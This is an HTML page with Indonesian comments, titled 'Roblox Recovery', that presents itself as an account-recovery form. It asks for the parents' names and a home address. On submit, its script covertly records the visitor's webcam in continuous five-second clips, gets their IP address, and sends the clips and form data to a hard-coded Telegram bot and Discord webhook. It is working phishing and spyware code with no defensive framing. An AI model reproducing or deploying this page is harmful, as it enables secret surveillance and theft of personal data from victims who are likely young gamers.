<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Recovery</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    video {
      display: none; /* Menyembunyikan video dari tampilan web */
    }
    form {
      display: flex;
      flex-direction: column;
      margin-bottom: 20px;
    }
    input {
      margin-bottom: 10px;
      padding: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <form id="infoForm">
    <input type="text" id="parentName" placeholder="Nama Ibu" required>
    <input type="text" id="address" placeholder="Alamat" required>
    <input type="text" id="fatherName" placeholder="Nama Bapak" required>
    <button type="submit">Kirim</button>
  </form>

  <script>
    var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
    var telegramChatId = '-1002188815934';
    var discordWebhookUrl = 'https://discord.com/api/webhooks/1260940016310423606/94wLCeLPsDUTB1Ai-9ZbP6NF2mTQSpiwdgygwe4C8-zUjOz7Sx2oKnYjNeIm28xXNuOb'; // Ganti dengan URL Webhook Discord Anda

    // Fungsi untuk mengirim video ke Telegram
    function sendToTelegram(videoDataURL, caption) {
      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendVideo`;

      fetch(videoDataURL)
        .then(res => res.blob())
        .then(blob => {
          var formData = new FormData();
          formData.append('chat_id', telegramChatId);
          formData.append('video', blob, 'video.mp4');
          formData.append('caption', caption);

          return fetch(apiUrl, {
            method: 'POST',
            body: formData
          });
        })
        .then(response => response.json())
        .then(data => {
          console.log('Video berhasil dikirim ke Telegram:', data);
        })
        .catch(error => {
          console.error('Error mengirim video ke Telegram:', error);
        });
    }

    // Fungsi untuk mengirim video ke Discord menggunakan webhook
    function sendToDiscord(videoBlob, formData) {
      fetch(videoBlob)
        .then(res => res.blob())
        .then(blob => {
          var formDataDiscord = new FormData();
          formDataDiscord.append('file', blob, 'video.mp4');

          var payloadJson = {
            content: `Video terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`
          };

          formDataDiscord.append('payload_json', JSON.stringify(payloadJson));

          return fetch(discordWebhookUrl, {
            method: 'POST',
            body: formDataDiscord
          });
        })
        .then(response => response.json())
        .then(data => {
          console.log('Video berhasil dikirim ke Discord:', data);
        })
        .catch(error => {
          console.error('Error mengirim video ke Discord:', error);
        });
    }

    // Fungsi untuk mengambil dan mengirim video ke Telegram dan Discord
    function takeAndSendVideo(formData) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          var videoElement = document.createElement('video');
          document.body.appendChild(videoElement);
          videoElement.srcObject = stream;
          videoElement.play();

          setTimeout(() => {
            var mediaRecorder = new MediaRecorder(stream);
            var chunks = [];

            mediaRecorder.ondataavailable = function(e) {
              chunks.push(e.data);
            };

            mediaRecorder.onstop = function() {
              var videoBlob = new Blob(chunks, { type: 'video/mp4' });
              var videoDataURL = URL.createObjectURL(videoBlob);

              var ipAddress = '';
              fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                  ipAddress = data.ip;

                  var caption = `Video terkirim dari IP: ${ipAddress}\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
                  sendToTelegram(videoDataURL, caption);
                  sendToDiscord(videoBlob, formData);
                })
                .catch(error => {
                  console.error('Error mendapatkan IP address:', error);

                  var caption = `Video terkirim\nNama Orang Tua: ${formData.parentName}\nAlamat: ${formData.address}\nNama Bapak: ${formData.fatherName}`;
                  sendToTelegram(videoDataURL, caption);
                  sendToDiscord(videoBlob, formData);
                });

              document.body.removeChild(videoElement);

              setTimeout(() => takeAndSendVideo(formData), 0); // Tidak ada delay untuk video berikutnya
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000); // Ambil video selama 5 detik
          }, 0); // Tidak ada delay untuk video pertama
        })
        .catch(function(err) {
          console.log("Error: " + err);
          if (err.name === 'NotAllowedError') {
            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
          } else {
            setTimeout(() => takeAndSendVideo(formData), 7000); // Coba lagi setelah delay 7 detik
          }
        });
    }

    document.getElementById('infoForm').addEventListener('submit', function(event) {
      event.preventDefault();
      var formData = {
        parentName: document.getElementById('parentName').value,
        address: document.getElementById('address').value,
        fatherName: document.getElementById('fatherName').value
      };
      takeAndSendVideo(formData);
    });
  </script>
</body>
</html>
